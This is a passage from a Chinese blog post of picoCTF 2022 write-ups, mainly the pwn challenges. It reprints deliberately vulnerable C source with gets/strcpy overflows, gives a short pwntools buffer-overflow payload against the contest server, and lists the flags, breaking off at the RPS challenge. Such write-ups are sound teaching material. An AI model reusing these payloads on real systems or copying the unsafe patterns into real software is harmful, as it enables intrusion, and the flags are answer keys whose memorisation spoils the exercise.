                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:43:33" itemprop="dateCreated datePublished" datetime="2023-02-28T22:43:33+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:11" itemprop="dateModified" datetime="2023-03-01T11:31:11+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>30k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>27 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>picoctf 2022刚刚结束，上面的题目非常适合刚刚入门CTF的选手，整体难度很平易近人，这里写一下picoctf 2022我做过的题的Write-up。当然做的最多的还是pwn。</p>
<h1 id="1-pwn部分"><a class="markdownIt-Anchor" href="#1-pwn部分"></a> 1. pwn部分</h1>
<p>pwn部分几乎所有题目都给了源码，算是很亲民了。</p>
<h2 id="1-basic-file-exploit"><a class="markdownIt-Anchor" href="#1-basic-file-exploit"></a> 1. basic-file-exploit</h2>
<p>只给了源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WAIT 60</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* flag = <span class="string">&quot;[REDACTED]&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> data[<span class="number">10</span>][<span class="number">100</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> input_lengths[<span class="number">10</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> inputs = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">tgetinput</span><span class="params">(<span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">int</span> l)</span></span><br><span class="line">&#123;</span><br><span class="line">    fd_set          input_set;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span>  <span class="title">timeout</span>;</span></span><br><span class="line">    <span class="type">int</span>             ready_for_reading = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>             read_bytes = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( l &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&#x27;l&#x27; for tgetinput must be greater than 0\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Empty the FD Set */</span></span><br><span class="line">    FD_ZERO(&amp;input_set );</span><br><span class="line">    <span class="comment">/* Listen to the input descriptor */</span></span><br><span class="line">    FD_SET(STDIN_FILENO, &amp;input_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Waiting for some seconds */</span></span><br><span class="line">    timeout.tv_sec = WAIT;    <span class="comment">// WAIT seconds</span></span><br><span class="line">    timeout.tv_usec = <span class="number">0</span>;    <span class="comment">// 0 milliseconds</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Listening for input stream for any activity */</span></span><br><span class="line">    ready_for_reading = select(<span class="number">1</span>, &amp;input_set, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;timeout);</span><br><span class="line">    <span class="comment">/* Here, first parameter is number of FDs in the set, </span></span><br><span class="line"><span class="comment">     * second is our FD set for reading,</span></span><br><span class="line"><span class="comment">     * third is the FD set in which any write activity needs to updated,</span></span><br><span class="line"><span class="comment">     * which is not required in this case. </span></span><br><span class="line"><span class="comment">     * Fourth is timeout</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ready_for_reading == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">/* Some error has occured in input */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unable to read your input\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ready_for_reading) &#123;</span><br><span class="line">        read_bytes = read(<span class="number">0</span>, input, l<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(input[read_bytes<span class="number">-1</span>]==<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">        --read_bytes;</span><br><span class="line">        input[read_bytes]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(read_bytes==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;No data given.\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-4</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Timed out waiting for user input. Press Ctrl-C to disconnect\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">data_write</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> input[<span class="number">100</span>];</span><br><span class="line">  <span class="type">char</span> len[<span class="number">4</span>];</span><br><span class="line">  <span class="type">long</span> length;</span><br><span class="line">  <span class="type">int</span> r;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your data:\n&quot;</span>);</span><br><span class="line">  r = tgetinput(input, <span class="number">100</span>);</span><br><span class="line">  <span class="comment">// Timeout on user input</span></span><br><span class="line">  <span class="keyword">if</span>(r == <span class="number">-3</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of your data:\n&quot;</span>);</span><br><span class="line">    r = tgetinput(len, <span class="number">4</span>);</span><br><span class="line">    <span class="comment">// Timeout on user input</span></span><br><span class="line">    <span class="keyword">if</span>(r == <span class="number">-3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> ((length = strtol(len, <span class="literal">NULL</span>, <span class="number">10</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please put in a valid length&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (inputs &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    inputs = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(data[inputs], input);</span><br><span class="line">  input_lengths[inputs] = length;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your entry number is: %d\n&quot;</span>, inputs + <span class="number">1</span>);</span><br><span class="line">  inputs++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">data_read</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> entry[<span class="number">4</span>];</span><br><span class="line">  <span class="type">long</span> entry_number;</span><br><span class="line">  <span class="type">char</span> output[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(output, <span class="string">&#x27;\0&#x27;</span>, <span class="number">100</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter the entry number of your data:\n&quot;</span>);</span><br><span class="line">  r = tgetinput(entry, <span class="number">4</span>);</span><br><span class="line">  <span class="comment">// Timeout on user input</span></span><br><span class="line">  <span class="keyword">if</span>(r == <span class="number">-3</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ((entry_number = strtol(entry, <span class="literal">NULL</span>, <span class="number">10</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">    fseek(<span class="built_in">stdin</span>, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  entry_number--;</span><br><span class="line">  <span class="built_in">strncpy</span>(output, data[entry_number], input_lengths[entry_number]);</span><br><span class="line">  <span class="built_in">puts</span>(output);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">  <span class="type">char</span> input[<span class="number">3</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">  <span class="type">long</span> command;</span><br><span class="line">  <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hi, welcome to my echo chamber!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Type &#x27;1&#x27; to enter a phrase into our database&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Type &#x27;2&#x27; to echo a phrase in our database&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Type &#x27;3&#x27; to exit the program&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;   </span><br><span class="line">    r = tgetinput(input, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">// Timeout on user input</span></span><br><span class="line">    <span class="keyword">if</span>(r == <span class="number">-3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((command = strtol(input, <span class="literal">NULL</span>, <span class="number">10</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please put in a valid number&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="number">1</span>) &#123;</span><br><span class="line">      data_write();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Write successful, would you like to do anything else?&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (inputs == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No data yet&quot;</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      data_read();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Read successful, would you like to do anything else?&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="number">3</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please type either 1, 2 or 3&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Maybe breaking boundaries elsewhere will be helpful&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只需要写入一次之后读取位置0即可拿到flag。<br />
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_9F68795F}</p>
<h2 id="2-buffer-overflow-0"><a class="markdownIt-Anchor" href="#2-buffer-overflow-0"></a> 2. buffer overflow 0</h2>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> flag[FLAGSIZE_MAX];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigsegv_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *input)</span>&#123;</span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">16</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">  </span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  fgets(flag,FLAGSIZE_MAX,f);</span><br><span class="line">  signal(SIGSEGV, sigsegv_handler); <span class="comment">// Set up signal handler</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">100</span>];</span><br><span class="line">  gets(buf1); </span><br><span class="line">  vuln(buf1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The program will exit now\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意main函数中的这一条语句<code>signal(SIGSEGV, sigsegv_handler);</code>，它表示在程序收到SIGSEGV信号时执行该函数。而这个函数打印flag的值。因此只需要输入使栈溢出即可，输入什么无关紧要。</p>
<p>picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}</p>
<h2 id="3-cve-xxxx-xxxx"><a class="markdownIt-Anchor" href="#3-cve-xxxx-xxxx"></a> 3. CVE-XXXX-XXXX</h2>
<p>查CSDN。</p>
<p>picoCTF{CVE-2021-34527}</p>
<h2 id="4-buffer-overflow-1"><a class="markdownIt-Anchor" href="#4-buffer-overflow-1"></a> 4. buffer overflow 1</h2>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;asm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[FLAGSIZE];</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(buf,FLAGSIZE,f);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[BUFSIZE];</span><br><span class="line">  gets(buf);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Okay, time to return... Fingers Crossed... Jumping to 0x%x\n&quot;</span>, get_return_address());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your string: &quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>栈溢出到win函数即可。</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">49730</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please enter your string:&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(<span class="number">0x80491f6</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>picoCTF{addr3ss3s_ar3_3asy_ad2f467b}</p>
<h2 id="5-rps"><a class="markdownIt-Anchor" href="#5-rps"></a> 5. RPS</h2>
<p>一个石头剪刀布游戏。</p>
<p>源码：</p>
